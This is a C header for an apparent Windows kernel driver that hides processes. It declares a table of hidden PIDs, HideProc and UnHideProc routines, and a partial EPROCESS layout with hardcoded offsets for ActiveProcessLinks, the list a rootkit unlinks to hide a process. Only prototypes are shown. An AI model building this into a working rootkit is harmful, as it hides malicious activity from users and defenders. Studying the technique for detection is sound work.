#pragma once

#define MAX_PIDS 256 // maximum number of hiding processes 
#define SYSTEM_PROCESS_PID 0x4

typedef struct {
	ULONG Pids[MAX_PIDS];
	ULONG_PTR ListEntry[MAX_PIDS];
	ERESOURCE Lock; 
	ULONG PidsCount; 
} Globals;


void Globals_Init(Globals* g_state);
ULONG Globals_AddProcesses(Globals* g_state, const ULONG* pids, ULONG count);
ULONG Globals_RemoveProcesses(Globals* g_state, const ULONG* pids, ULONG count);
int Globals_FindProcess(Globals* g_state, ULONG pid);
NTSTATUS HideProc(_In_ ULONG pid, _Out_ ULONG_PTR* ListEntry);
NTSTATUS UnHideProc(_In_ Globals* g_state, ULONG index); 
void WriteHiddenProcessesInOutputBuffer(ULONG* outputBuffer, Globals* g_state);

NTSTATUS CompleteRequest(PIRP Irp, NTSTATUS status, ULONG_PTR info);

#pragma pack(push, 1)  // Ensure 1-byte alignment
typedef struct _EPROCESS {
	char Reserved1[0x1C8];          // Skip to ProcessLock offset
	EX_PUSH_LOCK ProcessLock;       // Offset 0x1C8
	char Reserved2[0x8];           // Skip to ActiveProcessLinks offset
	LIST_ENTRY ActiveProcessLinks;  // Offset 0x1D8
	char Reserved3[0x630];
} EPROCESS; // size EPROCESS = 0x818
#pragma pack(pop)  // Restore previous alignment settings
